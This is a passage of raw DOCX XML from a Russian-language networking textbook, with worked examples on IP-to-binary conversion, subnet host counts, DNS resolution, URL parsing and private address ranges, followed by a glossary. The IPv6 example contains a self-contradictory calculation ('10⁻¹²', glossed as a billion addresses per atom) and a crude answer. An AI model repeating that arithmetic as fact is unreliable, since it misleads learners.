      </w:pPr>
      <w:r>
        <w:t>**URN (Uniform Resource Name)** — имя ресурса (указывает, **что** это, но не где)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Пример: `urn:isbn:978-3-16-148410-0` (книга по ISBN)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**URL** — это типа "Москва, ул. Ленина, д. 10" (адрес, где найти)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**URN** — это типа "Паспорт №1234567890" (идентификатор, но не место)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>На практике</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> почти всегда используют URL.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1.4. Примеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Преобразование IP-адреса в двоичный вид</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Преобразуй IP-адрес `192.168.0.1` в двоичный вид.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>192 → 11000000</w:t>
        <w:br/>
        <w:t>168 → 10101000</w:t>
        <w:br/>
        <w:t>0   → 00000000</w:t>
        <w:br/>
        <w:t>1   → 00000001</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `11000000.10101000.00000000.00000001`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Расчёт количества хостов в подсети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сколько хостов можно разместить в подсети `192.168.1.0/24`?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Маска `/24` → 24 бита на сеть, **8 бит на хосты**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество адресов = 2⁸ = 256</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минус 2 (адрес сети и broadcast) = **254 хоста**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 254 хоста.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Подсеть `/28`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сколько хостов в подсети `10.0.0.0/28`?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`/28` → 28 бит на сеть, **4 бита на хосты**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2⁴ = 16 адресов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минус 2 = **14 хостов**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 14 хостов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Полный путь DNS-резолвинга</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Опиши, что происходит, когда ты вводишь `youtube.com` в браузере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Браузер проверяет кэш**: Есть ли IP для `youtube.com`? Нет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ОС проверяет файл hosts**: Есть запись? Нет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ОС спрашивает DNS-резолвер** (например, `8.8.8.8`): "Какой IP у `youtube.com`?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Резолвер проверяет кэш**: Нет записи.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Резолвер спрашивает корневой DNS-сервер**: "Где `.com`?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Корневой сервер отвечает**: "Вот адрес TLD-сервера для `.com`"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Резолвер спрашивает TLD-сервер `.com`**: "Где `youtube.com`?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**TLD-сервер отвечает**: "Вот адрес авторитативного DNS-сервера YouTube"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Резолвер спрашивает авторитативный сервер YouTube**: "Какой IP у `youtube.com`?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Авторитативный сервер отвечает**: `142.250.185.46`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Резолвер возвращает IP браузеру**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Браузер подключается к `142.250.185.46:443`** (HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Страница загружается**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Разбор URL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Разбери URL на компоненты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://user:pass@example.com:8080/shop/product?id=123&amp;color=red#reviews</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Протокол:** `https`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логин:** `user`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Пароль:** `pass`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хост:** `example.com`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт:** `8080`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Путь:** `/shop/product`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Параметры:** `id=123`, `color=red`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Якорь:** `reviews`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 6: Сколько всего IPv4-адресов?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Докажи, что IPv4-адресов примерно 4.3 миллиарда.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>IPv4-адрес = 32 бита.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Количество вариантов = 2³² = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4,294,967,296</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ≈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4.3 млрд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4,294,967,296 адресов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 7: Сколько IPv6-адресов?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сколько IPv6-адресов существует?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>IPv6-адрес = 128 бит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Количество вариантов = 2¹²⁸ ≈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3.4 × 10³⁸</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (340 ундециллионов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для сравнения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество атомов на Земле ≈ 10⁵⁰</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество IPv6-адресов на каждый атом = 10³⁸ / 10⁵⁰ = **10⁻¹²** (миллиард адресов на атом)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Настолько дохуя, что хватит на всё.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 8: Частные IP-адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Какие из этих адресов являются приватными?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`192.168.1.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`8.8.8.8`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`10.0.0.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`172.16.0.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`203.0.113.1`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Приватные диапазоны:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`10.0.0.0/8`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`172.16.0.0/12`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`192.168.0.0/16`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Приватные: `192.168.1.1`, `10.0.0.1`, `172.16.0.1`  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Публичные: `8.8.8.8`, `203.0.113.1`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 9: Маска подсети в двоичном виде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Преобразуй маску `255.255.255.0` в двоичный вид.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>255 → 11111111</w:t>
        <w:br/>
        <w:t>255 → 11111111</w:t>
        <w:br/>
        <w:t>255 → 11111111</w:t>
        <w:br/>
        <w:t>0   → 00000000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `11111111.11111111.11111111.00000000` (или `/24`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 10: Определение сети и broadcast-адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Дана подсеть `192.168.10.0/24`. Каковы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адрес сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Broadcast-адрес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Диапазон хостов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Адрес сети:** `192.168.10.0` (все биты хостовой части = 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Broadcast-адрес:** `192.168.10.255` (все биты хостовой части = 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Диапазон хостов:** `192.168.10.1` – `192.168.10.254` (254 адреса)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1.5. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.11 (Системы счисления):** IP-адреса в двоичной системе, IPv6 в шестнадцатеричной</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.01 (Архитектура ЭВМ):** Адресация памяти vs адресация сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 3.01 (ОС):** Сетевой стек ОС, драйверы сетевых карт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8.04 (Протоколы Internet):** TCP/IP, UDP, HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8.07 (Модель OSI):** IP — протокол сетевого уровня (Layer 3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.02 (Криптография):** HTTPS, TLS/SSL-шифрование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP-адрес (Internet Protocol address)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — уникальный числовой идентификатор устройства в сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPv4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол IP версии 4, использует 32-битные адреса (4 октета).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPv6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол IP версии 6, использует 128-битные адреса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Октет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 8 бит, один байт. В IPv4 адрес состоит из 4 октетов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Маска подсети (Subnet Mask)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 32-битное число, разделяющее IP-адрес на сетевую и хостовую части.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CIDR (Classless Inter-Domain Routing)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — метод адресации с использованием маски переменной длины (`/24`, `/16`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Приватный IP-адрес</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — IP из диапазонов, не маршрутизируемых в интернете (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Публичный IP-адрес</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — IP-адрес, уникальный в интернете, выданный провайдером.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NAT (Network Address Translation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — механизм подмены приватных IP на публичные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DNS (Domain Name System)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система преобразования доменных имён в IP-адреса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доменное имя</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — символьное имя ресурса в интернете (например, `google.com`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TLD (Top-Level Domain)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — домен верхнего уровня (`.com`, `.org`, `.ru`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FQDN (Fully Qualified Domain Name)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — полное доменное имя (например, `mail.google.com.`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DNS-резолвинг (разрешение имён)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс преобразования доменного имени в IP-адрес.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рекурсивный DNS-сервер (резолвер)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сервер, выполняющий полный поиск IP-адреса за клиента.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Авторитативный DNS-сервер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сервер, хранящий записи для конкретного домена.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TTL (Time To Live)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — время жизни DNS-записи в кэше.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>URL (Uniform Resource Locator)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — адрес ресурса в интернете.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>URI (Uniform Resource Identifier)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — общий термин для идентификации ресурса (включает URL и URN).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Протокол</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способ доступа к ресурсу (`http`, `https`, `ftp`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
